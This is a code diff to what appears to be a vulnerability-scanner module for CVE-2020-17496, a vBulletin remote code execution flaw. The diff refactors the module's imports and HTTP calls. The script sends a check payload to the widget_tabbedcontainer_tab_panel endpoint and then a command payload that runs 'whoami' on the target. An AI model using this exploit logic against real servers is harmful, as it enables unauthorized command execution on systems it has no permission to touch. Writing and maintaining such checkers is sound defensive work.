@@ -1,10 +1,7 @@
 #!/usr/bin/python3
 
-import string
-import random
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class CVE_2020_17496_BaseVerify:
      def __init__(self, url):
@@ -15,10 +12,7 @@ class CVE_2020_17496_BaseVerify:
           if '/ajax/render/widget_tabbedcontainer_tab_panel' not in self.payload_url:
                self.payload_url = self.payload_url + '/ajax/render/widget_tabbedcontainer_tab_panel'
           self.osname = 'Unknown'
-          self.capta = '' 
-          words=''.join((string.ascii_letters,string.digits))
-          for i in range(8):
-               self.capta = self.capta + random.choice(words) 
+          self.capta = get_capta()
           self.headers = {
             'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
           }
@@ -38,7 +32,7 @@ class CVE_2020_17496_BaseVerify:
           :param:
           :return True or False
           """
-          check_req = requests.post(self.payload_url, data = self.check_payload, allow_redirects = False, verify = False)
+          check_req = request.post(self.payload_url, data = self.check_payload)
           try:
                if check_req.status_code == 200 and self.capta in check_req.text:
                     if 'windows' in check_req.text:
@@ -63,7 +57,7 @@ class CVE_2020_17496_BaseVerify:
           """
           try:
                if self.check():
-                    cmd_req = requests.post(self.payload_url, headers = self.headers, data = self.cmd_payload, allow_redirects = False, verify = False)
+                    cmd_req = request.post(self.payload_url, headers = self.headers, data = self.cmd_payload)
                     if cmd_req.status_code == 200:
                          print('存在CVE_2019_16759_Bypass 漏洞,执行whoami命令结果为:', cmd_req.text.strip())
                          return True
